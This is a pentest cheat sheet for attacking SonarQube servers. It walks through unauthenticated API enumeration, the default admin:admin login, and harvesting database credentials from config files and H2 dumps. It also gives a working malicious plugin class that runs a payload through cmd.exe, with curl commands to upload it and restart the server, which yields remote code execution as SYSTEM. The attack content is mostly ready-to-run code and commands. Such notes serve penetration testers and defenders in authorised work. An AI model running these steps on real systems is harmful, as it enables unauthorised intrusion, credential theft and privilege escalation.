# SonarQube

SonarQube is a Java-based code quality platform. Exposed instances often leak version data through APIs, and authenticated admin access can lead to command execution through plugin upload and restart workflows.

## Discovery

```bash
curl -I http://TARGET:9000/
curl http://TARGET:9000/api/system/status
curl http://TARGET:9000/api/server/version
curl http://TARGET:9000/api/webservices/list | jq .
```

Interesting unauthenticated checks:

```bash
curl http://TARGET:9000/api/components/search?qualifiers=TRK
curl http://TARGET:9000/api/projects/search
```

Default credentials are commonly:

```text
admin:admin
```

## Credential Hunting

Check SonarQube configuration and backups for database credentials:

```cmd
type C:\Sonarqube\sonarqube-VERSION\conf\sonar.properties
type C:\Sonarqube\sonarqube-VERSION\conf\sonar.properties.bak
```

Interesting keys:

```properties
sonar.jdbc.username=DB_USER
sonar.jdbc.password=DB_PASSWORD
sonar.jdbc.url=jdbc:h2:...
sonar.jdbc.url=jdbc:postgresql://...
```

If you find admin database credentials, try them against the web login as well.

## H2 Database Extraction

Older SonarQube installs may use H2 locally:

```cmd
dir C:\Sonarqube\sonarqube-VERSION\data
```

Files to grab:

```text
sonar.h2.db
sonar.lock.db
```

Use H2's Script tool to dump the database:

```bash
java -cp h2-VERSION.jar org.h2.tools.Script \
  -url "jdbc:h2:/path/to/sonar" \
  -user sa \
  -password "" \
  -script sonar_dump.sql
```

Then search the dump:

```bash
rg -i "user|login|admin|password|hash|token|credential" sonar_dump.sql
```

## Authenticated Plugin Upload RCE

Admin users can upload plugins. A malicious plugin can execute code when SonarQube loads it, often after a service restart.

Minimal plugin class pattern:

```java
import org.sonar.api.Plugin;

public class ExamplePlugin implements Plugin {
  @Override
  public void define(Context context) {
    try {
      new ProcessBuilder(
        "cmd.exe",
        "/c",
        "C:\\Windows\\Temp\\payload.exe"
      ).redirectErrorStream(true).start();
    } catch (Exception e) {
    }
  }
}
```

Build and upload:

```bash
mvn clean package

curl --user 'ADMIN:PASSWORD' \
  -X POST \
  -F file=@target/plugin.jar \
  http://TARGET:9000/api/updatecenter/upload

curl --user 'ADMIN:PASSWORD' \
  -X POST \
  http://TARGET:9000/api/system/restart
```

If the SonarQube service runs as `LocalSystem`, the plugin executes as `NT AUTHORITY\SYSTEM`.

## Windows Service Checks

```cmd
sc qc SonarQube
icacls C:\Sonarqube\
icacls C:\Sonarqube\nssm.exe
icacls C:\Sonarqube\sonarqube-VERSION\bin\windows-x86-64\*.exe
```

Watch for:

```text
SERVICE_START_NAME : LocalSystem
writable service wrapper
writable install directory
writable plugin directory
```

Writable service binaries or service wrapper paths can be abused as standard Windows service privilege escalation. See [Windows Privilege Escalation](../windows-priv-esc/win-priv-esc.md).

